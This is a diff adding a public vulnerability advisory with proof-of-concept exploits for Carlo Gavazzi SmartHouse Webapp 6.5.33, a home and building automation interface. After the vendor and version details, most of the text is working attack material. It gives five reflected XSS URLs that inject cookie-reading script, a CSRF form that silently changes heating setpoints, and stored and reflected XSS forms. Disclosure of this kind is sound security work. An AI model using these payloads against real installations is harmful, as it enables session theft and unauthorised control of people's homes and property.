@@ -1,0 +1,123 @@
+# Exploit Title: SmartHouse Webapp 6.5.33 - Cross-Site Request Forgery
+# Discovery by: LiquidWorm
+# Date: 2019-12-02
+# Vendor Homepage: 
+# Tested Version: 6.5.33.17072501
+# CVE: N/A
+# Advisory ID: ZSL-2019-5543
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5543.php
+
+Carlo Gavazzi SmartHouse Webapp 6.5.33 CSRF/XSS Vulnerabilities
+
+
+Vendor: Carlo Gavazzi Automation S.p.A
+Product web page: http://www.gavazzi-automation.com | http://www.smarthouse.nu
+Affected version: Web-app: 6.5.33.17072501
+                  Web-app: 6.5.32.17062101
+                  Web-app: 6.2.3.16102701
+                  Web-app: 5.5.3.160421101
+                  Web-app: 5.3.3.15120101
+                  Release: 1.0.5.1
+                  Release: 1.0.5.0
+                  Release: 1.0.3.5
+                  Release: 1.0.3.2
+
+Summary: Carlo Gavazzi is an international company that develops, manufactures
+and sells electrical automation components. Our products are used in industrial
+automation and real estate automation. Smart-house is based on a system that we
+have developed and produced since 1986, mainly for industrial-related installations.
+Our system is present in more than 150,000 installations. For a few years now, we
+have focused our development on smart electrical installations for home and property
+automation. Smart-house is currently installed in both villas and commercial properties.
+
+Desc: The application suffers from multiple CSRF and XSS vulnerabilities. The application
+allows users to perform certain actions via HTTP requests without performing any validity
+checks to verify the requests. This can be exploited to perform certain actions with
+administrative privileges if a logged-in user visits a malicious web site. Input passed
+to several GET/POST parameters is not properly sanitised before being returned to the user.
+This can be exploited to execute arbitrary HTML and script code in a user's browser session
+in context of an affected site.
+
+Tested on: Apache
+           PHP
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5543
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5543.php
+
+
+01.11.2019
+
+--
+
+
+Reflected XSS (GET):
+--------------------
+
+1. http://192.168.0.24/app/index.php?error=Waddup"><script>confirm(document.cookie)</script> (pre-auth)
+2. http://192.168.0.24/app/messagepage.php?msg=<script>confirm(document.cookie)</script> (pre-auth)
+3. http://192.168.0.24/app/detaf.php?p=0&l=50"><script>confirm(document.cookie)</script>&f=5658 (post-auth)
+4. http://192.168.0.24/app/detaf.php?p=0"><script>confirm(document.cookie)</script>&l=50&f=5658 (post-auth)
+5. http://192.168.0.24/?functionsh=list&part[]=fn__intrudermain001&part[]=fn__intrudersec002&name=IntruderMainFunction"><script>confirm(document.cookie)</script>&grpl=1 (post-auth)
+
+
+CSRF set temperature:
+---------------------
+
+<html>
+  <body>
+    <form action="http://192.168.0.24/app/datasend.php" method="POST">
+      <input type="hidden" name="IDFunction" value="3875" />
+      <input type="hidden" name="favorite" value="0" />
+      <input type="hidden" name="rooms" value="-1" />
+      <input type="hidden" name="userId" value="-300" />
+      <input type="hidden" name="heat_ensave_set" value="24" />
+      <input type="hidden" name="heat_set" value="25.5" />
+      <input type="submit" value="Set" />
+    </form>
+  </body>
+</html>
+
+
+Stored XSS (POST):
+------------------
+
+<html>
+  <body>
+    <form action="http://192.168.0.24/app/command.php" method="POST">
+      <input type="hidden" name="op" value="11" />
+      <input type="hidden" name="name" value='Graph name"><script>confirm(document.cookie)</script>' />
+      <input type="hidden" name="period" value="2" />
+      <input type="hidden" name="gg" value="6" />
+      <input type="hidden" name="ggf" value="6" />
+      <input type="hidden" name="mm" value="11" />
+      <input type="hidden" name="mmf" value="11" />
+      <input type="hidden" name="aa" value="2019" />
+      <input type="hidden" name="aaf" value="2019" />
+      <input type="hidden" name="param" value="[1]" />
+      <input type="submit" value="Send" />
+    </form>
+  </body>
+</html>
+
+
+Reflected XSS (POST):
+---------------------
+
+<html>
+  <body>
+    <form action="http://192.168.0.24/refresh.php">
+      <input type="hidden" name="param[0][]" value="switch0251<script>confirm(document.cookie)</script>" />
+      <input type="hidden" name="param[0][]" value="0251" />
+      <input type="hidden" name="param[0][]" value="switch" />
+      <input type="hidden" name="param[1][]" value="switch1250" />
+      <input type="hidden" name="param[1][]" value="1250" />
+      <input type="hidden" name="param[1][]" value="switch" />
+      <input type="submit" value="Send" />
+    </form>
+  </body>
+</html>
